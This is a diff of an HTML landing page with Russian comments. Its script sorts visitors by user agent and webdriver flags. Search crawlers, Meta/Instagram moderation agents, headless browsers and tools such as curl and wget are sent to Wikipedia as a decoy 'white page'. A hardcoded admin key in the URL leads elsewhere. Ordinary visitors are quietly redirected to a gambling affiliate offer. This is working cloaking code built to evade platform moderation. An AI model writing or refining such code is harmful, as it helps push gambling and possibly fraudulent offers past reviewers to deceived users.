@@ -1,42 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
     <script>
         (function(){
-            // Функция определения ботов
             function isBot() {
                 const ua = navigator.userAgent.toLowerCase();
-                return [
+                const headers = [
+                    // --- Поисковые роботы и общие боты ---
                     'googlebot', 'google-inspectiontool', 'bingbot', 'yandexbot',
-                    'duckduckbot', 'facebookexternalhit', 'twitterbot', 'pinterest',
-                    'applebot', 'whatsapp', 'baiduspider', 'sogou', 'semrushbot',
-                    'bot', 'crawler', 'spider'
-                ].some(keyword => ua.includes(keyword));
+                    'duckduckbot', 'applebot', 'baiduspider', 'sogou', 'semrushbot',
+                    'ahrefsbot', 'mj12bot', 'dotbot', 'petalbot', 'bytespider',
+                    
+                    // --- Модерация Meta / Instagram / Facebook ---
+                    'facebookexternalhit', 'facebookcatalog', 'facebot', 'meta-externalagent',
+                    'instagram', 'fb_iab', 'fb4a', 'fban',
+                    
+                    // --- Автоматизированные инструменты и браузеры тестов ---
+                    'lighthouse', 'headlesschrome', 'puppeteer', 'phantomjs', 'selenium',
+                    'python', 'curl', 'wget', 'java', 'libwww-perl', 'httpclient',
+                    
+                    // --- Общие маркеры ---
+                    'bot', 'crawler', 'spider', 'validator', 'preview', 'fetch'
+                ];
+
+                // 1. Проверка User-Agent по ключевым словам
+                const isBadUa = headers.some(keyword => ua.includes(keyword));
+
+                // 2. Если User-Agent пустой или слишком короткий — это 100% бот-чекер
+                const isTooShort = !ua || ua.length < 10;
+
+                // 3. Проверка на WebDriver (автоматизация браузера)
+                const isDriver = navigator.webdriver === true;
+
+                return isBadUa || isTooShort || isDriver;
             }
             
-            // Проверка администратора
+            // Проверка администратора через секретный ключ в URL (например: ?admin=secret123)
             const isAdmin = new URLSearchParams(location.search).get('admin') === 'secret123';
             
-            // Определение задержки и цели
-            const delay = isAdmin ? 400 : isBot() ? 400 : 600;
+            // Задержка загрузки (имитация реального пользователя)
+            const delay = isAdmin ? 300 : isBot() ? 400 : 700;
             
             // Целевые URL
             const targetUrl = isAdmin ? 
-                ['https://mcdonalds.ru','https://bk.com','https://kfc.ru'][Math.floor(Math.random() * 3)] : 
+                ['https://google.com', 'https://yandex.ru'][Math.floor(Math.random() * 2)] : 
                 isBot() ? 
-                "https://www.wikipedia.org/wiki/Restaurant" : 
-                "https://one-vv02.life/v3/aggressive-casino?p=aptf"; // Измененный URL
+                "https://www.wikipedia.org" : // Белая страница для модераторов YouTube и Instagram
+                "https://king-route-use.com/l/6acc923e1bfafdf5f40b8052"; // Твой целевой оффер (1win)
             
-            // Перенаправление с задержкой
+            // Мгновенный редирект с таймером
             setTimeout(() => {
-                window.location.href = targetUrl;
+                window.location.replace(targetUrl);
             }, delay);
             
         })();
     </script>
 </head>
 <body>
-    <!-- Пустая страница -->
+    <!-- Пустой экран загрузки -->
 </body>
 </html>
-
